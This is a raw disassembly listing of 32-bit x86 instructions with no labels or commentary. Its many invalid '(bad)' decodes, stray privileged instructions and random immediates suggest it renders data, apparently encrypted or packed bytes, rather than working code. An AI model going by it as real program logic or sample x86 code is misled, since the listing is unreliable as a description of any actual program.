  41f893:	sar    DWORD PTR [ecx-0x1e5cb6a2],1
  41f899:	je     0x41f898
  41f89b:	push   edx
  41f89c:	cld    
  41f89d:	jle    0x41f86b
  41f89f:	iret   
  41f8a0:	stc    
  41f8a1:	arpl   WORD PTR [ecx+eiz*4],cx
  41f8a4:	out    dx,eax
  41f8a5:	jo     0x41f85d
  41f8a7:	xchg   esi,eax
  41f8a8:	shl    DWORD PTR [edi+0x63d1ad93],1
  41f8ae:	pop    ecx
  41f8af:	loopne 0x41f843
  41f8b1:	test   al,0xe4
  41f8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8b4:	push   ecx
  41f8b5:	fmul   st,st(3)
  41f8b7:	push   ebp
  41f8b8:	test   eax,0xe6ec26ad
  41f8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8be:	daa    
  41f8bf:	dec    ebp
  41f8c0:	test   DWORD PTR [edx],edi
  41f8c2:	je     0x41f848
  41f8c4:	xchg   edi,eax
  41f8c5:	std    
  41f8c6:	xor    eax,0x932b8fec
  41f8cb:	mov    esp,0xcb70fe5e
  41f8d0:	push   ecx
  41f8d1:	hlt    
  41f8d2:	das    
  41f8d3:	push   ebp
  41f8d4:	push   esp
  41f8d5:	push   edx
  41f8d6:	push   ebx
  41f8d7:	fdivrp st(5),st
  41f8d9:	dec    edi
  41f8da:	dec    ebx
  41f8db:	pop    eax
  41f8dc:	fldcw  WORD PTR [ebx+edi*1+0x5fa3e47a]
  41f8e3:	fnstenv [edi]
  41f8e5:	gs push esi
  41f8e7:	mov    edi,0x3eacc7a9
  41f8ec:	jne    0x41f92f
  41f8ee:	and    eax,0x24f228e7
  41f8f3:	sub    al,0xd6
  41f8f5:	or     ah,BYTE PTR [ebp-0x61]
  41f8f8:	cmp    bh,BYTE PTR [esi+0x6816beea]
  41f8fe:	adc    eax,0xd7815606
  41f903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f904:	cmp    dh,BYTE PTR [edx+ebp*2]
  41f907:	sub    cl,BYTE PTR [ecx+0x5e]
  41f90a:	imul   ebx,DWORD PTR [esi],0xffffffb2
  41f90d:	ror    ch,0x9e
  41f910:	ret    
  41f911:	xchg   DWORD PTR [ebx],edx
  41f913:	fucomp st(1)
  41f915:	jge    0x41f907
  41f917:	mov    dl,0xad
  41f919:	push   ecx
  41f91a:	leave  
  41f91b:	pop    ds
  41f91c:	loopne 0x41f8cf
  41f91e:	jnp    0x41f8fa
  41f920:	add    eax,0x7826f2f7
  41f925:	dec    eax
  41f926:	lds    esp,FWORD PTR [eax-0x7e]
  41f929:	mov    eax,ds:0x12b899ba
  41f92e:	rcl    esi,1
  41f930:	xchg   esi,eax
  41f931:	add    al,0x7
  41f933:	les    ecx,FWORD PTR [ebp+ecx*4+0x51a2e18b]
  41f93a:	aas    
  41f93b:	inc    esp
  41f93c:	inc    edx
  41f93d:	sbb    ch,BYTE PTR [esi+0x53efe5aa]
  41f943:	int    0x39
  41f945:	adc    esp,esi
  41f947:	xlat   BYTE PTR ds:[ebx]
  41f948:	xor    eax,0xe9b81f2e
  41f94d:	pop    ebp
  41f94e:	bswap  ebp
  41f950:	mov    WORD PTR [ebx-0x56],ss
  41f953:	pop    eax
  41f954:	(bad)  
  41f955:	out    dx,eax
  41f956:	xchg   edx,eax
  41f957:	xor    eax,0xbf71a533
  41f95c:	cmp    edx,0x129c97c6
  41f962:	in     al,dx
  41f963:	pop    ebp
  41f964:	in     eax,dx
  41f965:	stos   BYTE PTR es:[edi],al
  41f966:	ins    BYTE PTR es:[edi],dx
  41f967:	dec    edx
  41f968:	mov    ds:0x7c57303e,eax
  41f96d:	xchg   ebp,eax
  41f96e:	imul   esp,DWORD PTR [ecx-0x3e],0x663decd0
  41f975:	and    eax,0xd1f687
  41f97a:	add    BYTE PTR [eax],al
  41f97c:	and    BYTE PTR [esi],dl
  41f97e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97f:	lea    esi,[esi+0x25bf29bf]
  41f985:	lods   eax,DWORD PTR ds:[esi]
  41f986:	and    dl,al
  41f988:	push   ebp
  41f989:	in     al,0xcb
  41f98b:	test   BYTE PTR [eax],ah
  41f98d:	jbe    0x41f990
  41f98f:	add    BYTE PTR [ebp-0x55fffffe],al
  41f995:	push   esi
  41f996:	jle    0x41f9d8
  41f998:	cmp    DWORD PTR [eax+0x51],ecx
  41f99b:	add    DWORD PTR [edx+0x17215555],esp
  41f9a1:	pop    ss
  41f9a2:	stos   DWORD PTR es:[edi],eax
  41f9a3:	jmp    0xeadd:0xa0b460dd
  41f9aa:	(bad)  
  41f9ab:	(bad)  [esi+0x3b]
  41f9ae:	stos   BYTE PTR es:[edi],al
  41f9af:	cs test al,0x26
  41f9b2:	or     eax,DWORD PTR [esi]
  41f9b4:	mov    ds:0x80554075,eax
  41f9b9:	and    eax,0x96ed2e7c
  41f9be:	maxps  xmm5,xmm3
  41f9c1:	pop    ds
  41f9c2:	loopne 0x41f9b6
  41f9c4:	les    ebp,FWORD PTR [edi]
  41f9c6:	adc    eax,0x9bb26103
  41f9cb:	inc    edi
  41f9cc:	push   ebx
  41f9cd:	scas   eax,DWORD PTR es:[edi]
  41f9ce:	pushf  
  41f9cf:	loope  0x41fa13
  41f9d1:	inc    ebx
  41f9d2:	in     al,0xbd
  41f9d4:	adc    al,0x98
  41f9d6:	cld    
  41f9d7:	sbb    bl,cl
  41f9d9:	mov    esi,0xc49f2648
  41f9de:	jae    0x41f9e6
  41f9e0:	fdivr  QWORD PTR [ecx]
  41f9e2:	add    ch,bl
  41f9e4:	push   ebp
  41f9e5:	xchg   edx,eax
  41f9e6:	push   esp
  41f9e7:	les    ebp,FWORD PTR [ecx+0x3bb9eec3]
  41f9ed:	jle    0x41fa03
  41f9ef:	dec    eax
  41f9f0:	je     0x41fa33
  41f9f2:	and    ebp,DWORD PTR ds:0x5751a9f7
  41f9f8:	test   ah,cl
  41f9fa:	or     DWORD PTR [edx+0x615f127f],esp
  41fa00:	dec    ebp
  41fa01:	in     al,0xca
  41fa03:	fild   QWORD PTR [ebx-0x9]
  41fa06:	sbb    cl,cl
  41fa08:	fdiv   QWORD PTR [edi+0x54]
  41fa0b:	rcl    ah,0xef
  41fa0e:	fadd   QWORD PTR [ebp+0x4c]
  41fa11:	mov    al,ds:0x383dc37c
  41fa16:	ins    BYTE PTR es:[edi],dx
  41fa17:	mov    DWORD PTR [esi-0x7d29059b],ebx
  41fa1d:	pop    esi
  41fa1e:	fidiv  WORD PTR [edx-0x46449448]
  41fa24:	mov    cl,0xea
  41fa26:	dec    edx
  41fa27:	in     al,0xf8
  41fa29:	xor    dh,BYTE PTR [ecx-0x6feef14b]
  41fa2f:	repnz aaa 
  41fa31:	mov    WORD PTR [ebp+0x24083371],ss
  41fa37:	dec    esi
  41fa38:	outs   dx,BYTE PTR ds:[esi]
  41fa39:	sbb    DWORD PTR [eax+0x3068c729],0x3
  41fa40:	mov    ebp,0xe2668ad7
  41fa45:	xchg   edi,eax
  41fa46:	mov    edx,DWORD PTR [eax-0x350fc3b1]
  41fa4c:	cmp    ebp,DWORD PTR [eax+0x7]
  41fa4f:	mov    BYTE PTR [edi-0x12],cl
  41fa52:	ins    DWORD PTR es:[edi],dx
  41fa53:	mov    ah,0x70
  41fa55:	sub    eax,0xf909119d
  41fa5a:	fsub   QWORD PTR ds:0x1a83996a
  41fa60:	adc    ecx,edi
  41fa62:	xor    DWORD PTR [edx],0x355a17df
  41fa68:	pop    es
  41fa69:	adc    eax,0x4d2161fb
  41fa6e:	mov    eax,ds:0xb1813303
  41fa73:	cmc    
  41fa74:	rcr    DWORD PTR [esi-0x66],cl
  41fa77:	aad    0x80
  41fa79:	retf   
  41fa7a:	rcl    BYTE PTR [ebx+0x4d2c2e8],0x95
  41fa81:	jle    0x41fab9
  41fa83:	jg     0x41fb03
  41fa85:	xchg   esi,eax
  41fa86:	dec    ebp
  41fa87:	aaa    
  41fa88:	dec    ebp
  41fa89:	stos   BYTE PTR es:[edi],al
  41fa8a:	mov    esp,0xb5a74e3
  41fa8f:	xor    al,0x89
  41fa91:	mov    BYTE PTR [edx+0x50bb764c],dl
  41fa97:	jae    0x41fb12
  41fa99:	dec    ebp
  41fa9a:	xchg   DWORD PTR [edi+eiz*8-0x7a],esp
  41fa9e:	mov    ch,0xb6
  41faa0:	cld    
  41faa1:	pop    ss
  41faa2:	ret    0xced1
  41faa5:	cmp    DWORD PTR [edx],edx
  41faa7:	mov    ebx,0xec31de00
  41faac:	scas   eax,DWORD PTR es:[edi]
  41faad:	pop    ss
  41faae:	add    eax,0x39b41f91
  41fab3:	lds    esp,FWORD PTR ds:0x4917ae59
  41fab9:	ret    0x7a55
  41fabc:	in     eax,0xbc
  41fabe:	pusha  
  41fabf:	js     0x41fa57
  41fac1:	mov    edx,0x6194cb94
  41fac6:	sahf   
  41fac7:	xor    bh,dh
  41fac9:	and    DWORD PTR [eax],esi
  41facb:	inc    esi
  41facc:	mov    bh,0x36
  41face:	loop   0x41fab1
  41fad0:	into   
  41fad1:	aaa    
  41fad2:	leave  
  41fad3:	push   edi
  41fad4:	bound  ecx,QWORD PTR [ebx+0x79ef7c07]
  41fada:	scas   eax,DWORD PTR es:[edi]
  41fadb:	dec    edi
  41fadc:	mov    DWORD PTR [eax-0x71],esp
  41fadf:	aas    
  41fae0:	aas    
  41fae1:	adc    edx,DWORD PTR [edi]
  41fae3:	mov    esi,0xddc9eac0
  41fae8:	pop    es
  41fae9:	or     bh,al
  41faeb:	in     eax,0x5
  41faed:	mov    al,ds:0xb3ecfe17
  41faf2:	hlt    
  41faf3:	mov    al,0x3d
  41faf5:	mov    ah,0x4c
  41faf7:	(bad)  
  41faf8:	imul   esi,DWORD PTR [edi-0xadaf33c],0x28
  41faff:	rcr    BYTE PTR [esi+0x74],0x95
  41fb03:	popa   
  41fb04:	sbb    DWORD PTR [esi-0x68835bdf],esi
  41fb0a:	jns    0x41fa93
  41fb0c:	xor    eax,0x4698ada9
  41fb11:	stos   BYTE PTR es:[edi],al
  41fb12:	mov    bl,0x44
  41fb14:	out    0x61,al
  41fb16:	or     al,0x28
  41fb18:	mov    al,ds:0x26182777
  41fb1d:	cli    
  41fb1e:	enter  0xa598,0x89
  41fb22:	pop    ebx
  41fb23:	cmp    al,0x24
  41fb25:	and    DWORD PTR [ebx-0x1402140d],0x66
  41fb2c:	(bad)  
  41fb2d:	jmp    0x421153f1
  41fb32:	addr16 and eax,0x6fdc1dff
  41fb38:	not    BYTE PTR [esi-0x30f7e9c4]
  41fb3e:	xchg   BYTE PTR [ecx],ah
  41fb40:	mov    eax,0x8cdf3cc7
  41fb45:	xor    ebx,DWORD PTR [edi+edx*8]
  41fb48:	enter  0x8164,0x5f
  41fb4c:	(bad)  
  41fb4d:	mov    ebx,0xc21f36ba
  41fb52:	jg     0x41fba2
  41fb54:	scas   eax,DWORD PTR es:[edi]
  41fb55:	cmp    eax,0xe701c4a7
  41fb5a:	sti    
  41fb5b:	test   al,0xf1
  41fb5d:	sub    eax,0x6457cec
  41fb62:	(bad)  
  41fb63:	xrelease mov DWORD PTR [ecx-0x33],esi
  41fb67:	or     DWORD PTR [esp+ebx*8],esp
  41fb6a:	clc    
  41fb6b:	call   0xeee5:0x7a7c1b2e
  41fb72:	dec    edi
  41fb73:	adc    ch,al
  41fb75:	push   edx
  41fb76:	xor    al,0x98
  41fb78:	dec    eax
  41fb79:	repnz fst QWORD PTR [ebp-0x375896ea]
  41fb80:	mov    ebp,ecx
  41fb82:	push   esi
  41fb83:	pusha  
  41fb84:	and    dh,BYTE PTR [edi+0x231a7a6a]
  41fb8a:	(bad)  
  41fb8b:	stos   BYTE PTR es:[edi],al
  41fb8c:	nop
  41fb8d:	mov    esi,0x4de7221d
  41fb92:	cmp    bl,BYTE PTR [ebx+eax*2+0xb2707d7]
  41fb99:	cmp    eax,0x4f243733
  41fb9e:	inc    eax
  41fb9f:	push   ecx
  41fba0:	push   cs
  41fba1:	mov    ebp,0x32ac14f8
  41fba6:	test   al,0xa2
  41fba8:	gs cmp bl,bh
  41fbab:	mov    al,ds:0x24aea285
  41fbb0:	leave  
  41fbb1:	cld    
  41fbb2:	pop    ecx
  41fbb3:	or     BYTE PTR [edx-0x62c885f5],0x76
  41fbba:	scas   eax,DWORD PTR es:[edi]
  41fbbb:	fistp  DWORD PTR [ebx]
  41fbbd:	sbb    al,0x57
  41fbbf:	push   edi
  41fbc0:	in     al,dx
  41fbc1:	sbb    bl,BYTE PTR [ebx]
  41fbc3:	in     al,0x75
  41fbc5:	dec    edx
  41fbc6:	mov    al,ds:0x98a2ed6d
  41fbcb:	mov    ebx,0x2f0ff266
  41fbd0:	jns    0x41fc22
  41fbd2:	mov    cl,0x34
  41fbd4:	add    ah,BYTE PTR [esi+0x7c87ae42]
  41fbda:	mul    DWORD PTR [esi+ebx*4]
  41fbdd:	jle    0x41fc04
  41fbdf:	or     ebx,DWORD PTR [eax+0x3d]
  41fbe2:	(bad)  
  41fbe3:	jmp    0x447b:0x4c30eee1
  41fbea:	shl    BYTE PTR [edi],1
  41fbec:	rcl    ebp,0x2b
  41fbef:	pop    ebx
  41fbf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf1:	int    0x67
  41fbf3:	repz add DWORD PTR [esi],esp
  41fbf6:	js     0x41fbff
  41fbf8:	nop
  41fbf9:	xor    edx,DWORD PTR [esi+0x43]
  41fbfc:	sub    al,0x2e
  41fbfe:	(bad)  
  41fbff:	or     eax,0x6271015f
  41fc04:	and    edi,ecx
  41fc06:	cld    
  41fc07:	sti    
  41fc08:	sub    BYTE PTR [ecx-0x69],al
  41fc0b:	adc    eax,0x15c10998
  41fc10:	imul   eax,DWORD PTR [ecx-0x3b],0xffffffa7
  41fc14:	loopne 0x41fc55
  41fc16:	xlat   BYTE PTR ds:[ebx]
  41fc17:	mov    esi,esp
  41fc19:	add    BYTE PTR [eax],al
  41fc1b:	add    BYTE PTR [eax-0x4456c5cd],dh
  41fc21:	test   eax,0xb7853bb3
  41fc26:	mov    esi,0x718fa00c
  41fc2b:	lods   al,BYTE PTR ds:[esi]
  41fc2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc2d:	js     0x41fc30
  41fc2f:	add    BYTE PTR [ebp+0x7c000002],al
  41fc35:	and    WORD PTR [ecx-0x21],ax
  41fc39:	mov    al,0x2f
  41fc3b:	jmp    0x41fc5b
  41fc3d:	ds stc 
  41fc3f:	inc    ebx
  41fc40:	sub    DWORD PTR [esi],esp
  41fc42:	cdq    
  41fc43:	ror    edx,cl
  41fc45:	pop    edi
  41fc46:	jg     0x41fc3b
  41fc48:	cmp    al,0xfc
  41fc4a:	pop    edx
  41fc4b:	and    al,al
  41fc4d:	mov    eax,ds:0x98e916dc
  41fc52:	pop    ebp
  41fc53:	push   ecx
  41fc54:	fisttp QWORD PTR [esi+0x47f425d2]
  41fc5a:	push   es
  41fc5b:	aaa    
  41fc5c:	and    BYTE PTR [esi+0x2d8f4057],bh
  41fc62:	mov    edx,ds
  41fc64:	fstp   st(3)
  41fc66:	daa    
  41fc67:	js     0x41fc97
  41fc69:	ds retf 
  41fc6b:	int    0xbf
  41fc6d:	icebp  
  41fc6e:	or     bl,al
  41fc70:	iret   
  41fc71:	arpl   WORD PTR [ecx],bp
  41fc73:	stos   DWORD PTR es:[edi],eax
  41fc74:	stc    
  41fc75:	adc    eax,0x8015e91a
  41fc7a:	std    
  41fc7b:	lds    eax,FWORD PTR [esi]
  41fc7d:	jae    0x41fc44
  41fc7f:	inc    esi
  41fc80:	jge    0x41fcc5
  41fc82:	(bad)
  41fc86:	xchg   ecx,eax
  41fc87:	push   esi
  41fc88:	xchg   ecx,eax
  41fc89:	add    al,0x71
  41fc8b:	mov    fs,WORD PTR [edx]
  41fc8d:	or     BYTE PTR [edx],al
  41fc8f:	xchg   ebp,eax
  41fc90:	mov    edi,0x2a8713f3
  41fc95:	ffreep st(7)
  41fc97:	ss pop ds
  41fc99:	or     eax,0x955d2be7
  41fc9e:	aaa    
  41fc9f:	xchg   BYTE PTR [ebx-0x34],cl
  41fca2:	ds mov ebx,esp
  41fca5:	repz push ecx
  41fca7:	fiadd  DWORD PTR [ebx-0x13]
  41fcaa:	test   eax,0x142578aa
  41fcaf:	jl     0x41fc98
  41fcb1:	mov    WORD PTR [esi+0x5c1b3c8c],gs
  41fcb7:	sub    al,0x82
  41fcb9:	ret    
  41fcba:	xchg   edx,eax
  41fcbb:	fwait
  41fcbc:	cmp    eax,0xbb0da7ad
  41fcc1:	jmp    0x41fca6
  41fcc3:	neg    BYTE PTR [ebp+0x44]
  41fcc6:	mov    esi,0x2d5af835
  41fccb:	(bad)  
  41fccc:	aas    
  41fccd:	icebp  
  41fcce:	pop    ecx
  41fccf:	js     0x41fcf6
  41fcd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcd2:	xchg   esi,eax
  41fcd3:	cli    
  41fcd4:	dec    ebx
  41fcd5:	or     ebp,esi
  41fcd7:	xor    ebp,DWORD PTR [esi]
  41fcd9:	ja     0x41fd57
  41fcdb:	pop    ebx
  41fcdc:	sub    DWORD PTR [esi+0x638b3c55],eax
  41fce2:	cld    
  41fce3:	mov    edx,0xda52d51b
  41fce8:	mov    al,0x1f
  41fcea:	xor    ecx,ebx
  41fcec:	sub    bh,0x2d
  41fcef:	es stos DWORD PTR es:[edi],eax
  41fcf1:	push   ds
  41fcf2:	rcr    eax,cl
  41fcf4:	pop    ss
  41fcf5:	dec    ebp
  41fcf6:	addr16 inc ebp
  41fcf8:	mov    ds:0x944de7e1,al
  41fcfd:	inc    edi
  41fcfe:	dec    eax
  41fcff:	fnsave [edi+0x77]
  41fd02:	fdivr  QWORD PTR [ebx-0x11f6a7bf]
  41fd08:	dec    edi
  41fd09:	fnstenv [eax]
  41fd0b:	das    
  41fd0c:	pop    es
  41fd0d:	mov    bh,0x62
  41fd0f:	dec    edi
  41fd10:	mov    edi,eax
  41fd12:	test   DWORD PTR [edi+0xe7e364a],0xb7a9c2c0
  41fd1c:	mov    dl,0xc4
  41fd1e:	or     eax,0xe5f332d8
  41fd23:	or     esi,ebp
  41fd25:	dec    bh
  41fd27:	mov    esi,0x3828a3fe
  41fd2c:	jne    0x41fd5d
  41fd2e:	je     0x41fd64
  41fd30:	mov    ebx,0x4a5719f6
  41fd35:	pop    ds
  41fd36:	push   ebx
  41fd37:	mov    al,0x45
  41fd39:	cwde   
  41fd3a:	dec    ebp
  41fd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd3c:	out    dx,al
  41fd3d:	(bad)  
  41fd3e:	dec    edi
  41fd3f:	pop    ecx
  41fd40:	inc    ebp
  41fd41:	xchg   edi,eax
  41fd42:	jg     0x41fceb
  41fd44:	add    al,0xe1
  41fd46:	mov    dl,0x92
  41fd48:	sub    cl,BYTE PTR [esi]
  41fd4a:	pop    eax
  41fd4b:	ds (bad) 
  41fd4d:	test   ebx,ebx
  41fd4f:	adc    edx,DWORD PTR [esi+0x2a]
  41fd52:	frstor [edi+0x1a]
  41fd55:	mov    dl,0x51
  41fd57:	mov    ecx,0x4bba7de
  41fd5c:	dec    edi
  41fd5d:	jge    0x41fd4e
  41fd5f:	popf   
  41fd60:	dec    cx
  41fd62:	mov    dl,0x6b
  41fd64:	jecxz  0x41fce8
  41fd66:	cld    
  41fd67:	imul   ebx,DWORD PTR [ecx-0x38],0xffffffbb
  41fd6b:	clc    
  41fd6c:	pop    ss
  41fd6d:	in     al,dx
  41fd6e:	ins    DWORD PTR es:[edi],dx
  41fd6f:	cwde   
  41fd70:	cmp    al,0xd5
  41fd72:	cli    
  41fd73:	sbb    al,0xbd
  41fd75:	or     al,0x89
  41fd77:	retf   0x682d
  41fd7a:	ins    BYTE PTR es:[edi],dx
  41fd7b:	cs ds loopne 0x41fdd6
  41fd7f:	push   es
  41fd80:	cmp    esp,esp
  41fd82:	mov    esp,0xa7ca9f65
  41fd87:	inc    ecx
  41fd88:	les    edi,FWORD PTR [ecx+edx*2-0x75b5f950]
  41fd8f:	mov    bh,0xd6
  41fd91:	fld    DWORD PTR [eax]
  41fd93:	xor    BYTE PTR [edi+esi*8-0x2410ae55],bh
  41fd9a:	inc    ebp
  41fd9b:	cmp    ah,BYTE PTR ds:0xf9d4dc4d
  41fda1:	add    DWORD PTR [esi*1+0x515ff7b],esi
  41fda8:	xchg   esp,eax
  41fda9:	xchg   edi,eax
  41fdaa:	push   edx
  41fdab:	jne    0x41fd86
  41fdad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdae:	test   DWORD PTR [edx+0x1a],eax
  41fdb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdb2:	mov    dl,0xac
  41fdb4:	lock inc ebx
  41fdb6:	and    al,0x57
  41fdb8:	shl    BYTE PTR ds:0xe84f7dca,1
  41fdbe:	std    
  41fdbf:	dec    esp
  41fdc0:	push   0x3194accb
  41fdc5:	(bad)  
  41fdc6:	lods   al,BYTE PTR ds:[esi]
  41fdc7:	cs jne 0x41fe18
  41fdca:	fwait
  41fdcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdcc:	mov    ?,WORD PTR [eax]
  41fdce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdcf:	mov    bh,0x89
  41fdd1:	add    eax,0xcdb6d724
  41fdd6:	cmp    DWORD PTR [edx+0x5bb28712],0xffffff8f
  41fddd:	shl    eax,cl
  41fddf:	dec    ebp
  41fde0:	mov    ecx,0xe8af32db
  41fde5:	or     BYTE PTR [edx],cl
  41fde7:	pop    esi
  41fde8:	jg     0x41fe33
  41fdea:	pop    ecx
  41fdeb:	call   0x2b68dcea
  41fdf0:	aas    
  41fdf1:	scas   al,BYTE PTR es:[edi]
  41fdf2:	ja     0x41fe07
  41fdf4:	add    BYTE PTR [ebx],dh
  41fdf6:	xchg   edi,eax
  41fdf7:	jns    0x41fd8e
  41fdf9:	fwait
  41fdfa:	pop    ds
  41fdfb:	adc    DWORD PTR ss:[edi],esp
  41fdfe:	xor    al,0xca
  41fe00:	retf   
  41fe01:	and    eax,0x5b83695a
  41fe06:	(bad)  
  41fe07:	jnp    0x41fdc6
  41fe09:	in     al,0x8e
  41fe0b:	jge    0x41fe46
  41fe0d:	jmp    0x41fe11
  41fe0f:	lock aaa 
  41fe11:	xor    DWORD PTR [esi],0xe43e465f
  41fe17:	arpl   WORD PTR [eax-0xe56c655],cx
  41fe1d:	es jp  0x41fe0e
  41fe20:	and    eax,0xe44b3c3
  41fe25:	cmp    DWORD PTR [esp+esi*2],0xb
  41fe29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe2a:	or     esp,DWORD PTR [edx+0x794e4c9c]
  41fe30:	ror    BYTE PTR [edi],0x7e
  41fe33:	pop    eax
  41fe34:	mov    esp,0x9fba26cd
  41fe39:	jbe    0x41fe10
  41fe3b:	es (bad) 
  41fe3d:	dec    ebx
  41fe3e:	test   dh,ah
  41fe40:	mov    ecx,0x1d4fd3a4
  41fe45:	or     BYTE PTR [ecx-0x37],0x7b
  41fe49:	test   al,0xdb
  41fe4b:	add    ebx,DWORD PTR [ecx]
  41fe4d:	rcr    esi,cl
  41fe4f:	hlt    
  41fe50:	sbb    DWORD PTR [ebp+0x2f],ebp
  41fe53:	fwait
  41fe54:	inc    esp
  41fe55:	ror    BYTE PTR ds:[ecx+0x6c23e893],0xf4
  41fe5d:	xchg   BYTE PTR [ebx+0x315cce35],dh
  41fe63:	cmp    al,0x20
  41fe65:	jmp    0x2ad1:0x799370e2
  41fe6c:	pushf  
  41fe6d:	outs   dx,BYTE PTR ds:[esi]
  41fe6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe6f:	mov    edx,0xed16ec38
  41fe74:	mov    dh,0x6c
  41fe76:	adc    al,0x82
  41fe78:	retf   
  41fe79:	data16 repz jo 0x41fe1f
  41fe7d:	inc    ebx
  41fe7e:	cmp    ah,cl
  41fe80:	jmp    0x4280:0xc43d5af3
  41fe87:	xlat   BYTE PTR ds:[ebx]
  41fe88:	lea    ecx,[eax]
  41fe8a:	mov    edx,ds
  41fe8c:	imul   ecx,DWORD PTR [edx],0x39
  41fe8f:	enter  0xf1fc,0xa5
  41fe93:	adc    BYTE PTR [edx],dl
  41fe95:	add    edx,0x5a0a3c82
  41fe9b:	scas   eax,DWORD PTR es:[edi]
  41fe9c:	jb     0x41fe78
  41fe9e:	leave  
  41fe9f:	xchg   ecx,eax
  41fea0:	js     0x41fe9a
  41fea2:	push   ebp
  41fea3:	lods   al,BYTE PTR ds:[esi]
  41fea4:	xor    DWORD PTR [eax],eax
  41fea6:	xchg   esp,eax
  41fea7:	push   esi
  41fea8:	push   0x9
  41feaa:	test   al,0xc5
  41feac:	neg    DWORD PTR [ecx+eiz*4]
  41feaf:	sub    ah,ch
  41feb1:	(bad)  
  41feb2:	mov    ds:0x6fb119b3,eax
  41feb7:	mov    dl,0xe5
  41feb9:	add    BYTE PTR [eax],al
  41febb:	add    BYTE PTR [ecx-0x6b36a2],ch
  41fec1:	xchg   edi,eax
  41fec2:	std    
  41fec3:	jg     0x41fecf
  41fec5:	in     al,0x99
  41fec7:	pop    ecx
  41fec8:	fsubr  QWORD PTR [edx-0x67]
  41fecb:	sbb    ebp,DWORD PTR [edx]
  41fecd:	jnp    0x41fed0
  41fecf:	add    BYTE PTR [ebp-0x10fffffe],al
  41fed5:	fiadd  WORD PTR [ebx+eiz*4-0x3eb43b18]
  41fedc:	cmp    eax,0xdbdb57e4
  41fee1:	push   ss
  41fee2:	jnp    0x41ff0a
  41fee4:	fxam   
  41fee6:	std    
  41fee7:	xlat   BYTE PTR ds:[ebx]
  41fee8:	xchg   ebx,eax
  41fee9:	xchg   edi,eax
  41feea:	loop   0x41ff43
  41feec:	mov    ebp,esi
  41feee:	sub    eax,DWORD PTR [ebx]
  41fef0:	cwde   
  41fef1:	jle    0x41fe97
  41fef3:	iret   
  41fef4:	fucomip st,st(2)
  41fef6:	ret    0xdc33
  41fef9:	jmp    0x41ff49
  41fefb:	xor    BYTE PTR [ebx],0x87
  41fefe:	je     0x41ff37
  41ff00:	cmp    ebp,DWORD PTR [esi]
  41ff02:	mov    edi,0xa2a71262
  41ff07:	xchg   ebx,eax
  41ff08:	xchg   ebp,eax
  41ff09:	pop    esp
  41ff0a:	iret   
  41ff0b:	adc    edi,edx
  41ff0d:	dec    edx
  41ff0e:	fistp  WORD PTR [edx+0x263257d3]
  41ff14:	and    al,0xe1
  41ff16:	ficomp DWORD PTR [ebp-0x1e80ab99]
  41ff1c:	pop    esp
  41ff1d:	sbb    ebx,eax
  41ff1f:	iretw  
  41ff21:	int3   
  41ff22:	push   edx
  41ff23:	fadd   QWORD PTR [ecx]
  41ff25:	pop    edi
  41ff26:	push   es
  41ff27:	pop    edx
  41ff28:	imul   esp,DWORD PTR [edx],0xffffffd9
  41ff2b:	cs or  bh,ch
  41ff2e:	cmc    
  41ff2f:	and    DWORD PTR [esi-0x5e],esi
  41ff32:	in     eax,0x2c
  41ff34:	sub    dh,bl
  41ff36:	sbb    BYTE PTR [ecx+ebx*2],bl
  41ff39:	sbb    BYTE PTR [ebp+0x3c],ah
  41ff3c:	adc    eax,0x1c7bbea
  41ff41:	fcom   DWORD PTR [eax+0x28]
  41ff44:	jl     0x41ff2b
  41ff46:	jns    0x41fede
  41ff48:	push   cs
  41ff49:	mov    ebx,DWORD PTR [edi+ebp*4-0x7d9aa02]
  41ff50:	cwde   
  41ff51:	xor    DWORD PTR [esi-0x58d27559],ebx
  41ff57:	jl     0x41feeb
  41ff59:	test   eax,0xad19de05
  41ff5e:	pop    esi
  41ff5f:	inc    edi
  41ff60:	mov    dl,0xfd
  41ff62:	lds    eax,FWORD PTR [esi+0x43]
  41ff65:	cdq    
  41ff66:	ins    BYTE PTR es:[edi],dx
  41ff67:	sub    BYTE PTR [edx+eax*8-0x1d9b568],bh
  41ff6e:	scas   al,BYTE PTR es:[edi]
  41ff6f:	pop    ss
  41ff70:	lea    ebp,[eax+0x3360d2ce]
  41ff76:	jp     0x260dd0a5
  41ff7c:	push   ds
  41ff7d:	inc    ebx
  41ff7e:	xchg   ecx,eax
  41ff7f:	ja     0x41ff93
  41ff81:	popa   
  41ff82:	push   ds
  41ff83:	enter  0x2be8,0xd5
  41ff87:	cmc    
  41ff88:	mov    ch,0xa1
  41ff8a:	dec    edi
  41ff8b:	fsub   st,st(3)
  41ff8d:	fstp   QWORD PTR [eax+ebp*8]
  41ff90:	aas    
  41ff91:	mov    al,ds:0x8b7064eb
  41ff96:	in     al,dx
  41ff97:	(bad)  
  41ff98:	push   0xa96aeb04
  41ff9d:	mov    ebp,0x6e469fd7
  41ffa2:	arpl   WORD PTR [eax],sp
  41ffa4:	ins    BYTE PTR es:[edi],dx
  41ffa5:	repnz es in al,dx
  41ffa8:	xchg   ebx,eax
  41ffa9:	(bad)  
  41ffaa:	loop   0x41ff3e
  41ffac:	ret    0xa484
  41ffaf:	or     ebp,DWORD PTR [esi]
  41ffb1:	aas    
  41ffb2:	lahf   
  41ffb3:	add    esp,ebp
  41ffb5:	scas   al,BYTE PTR es:[edi]
  41ffb6:	out    0xf6,eax
  41ffb8:	stos   BYTE PTR es:[edi],al
  41ffb9:	sub    al,BYTE PTR [ecx-0x4069a7af]
  41ffbf:	xchg   esp,eax
  41ffc0:	jp     0x41ff99
  41ffc2:	pop    esi
  41ffc3:	jmp    FWORD PTR [eax]
  41ffc5:	fild   DWORD PTR [ebp+0x33]
  41ffc8:	hlt    
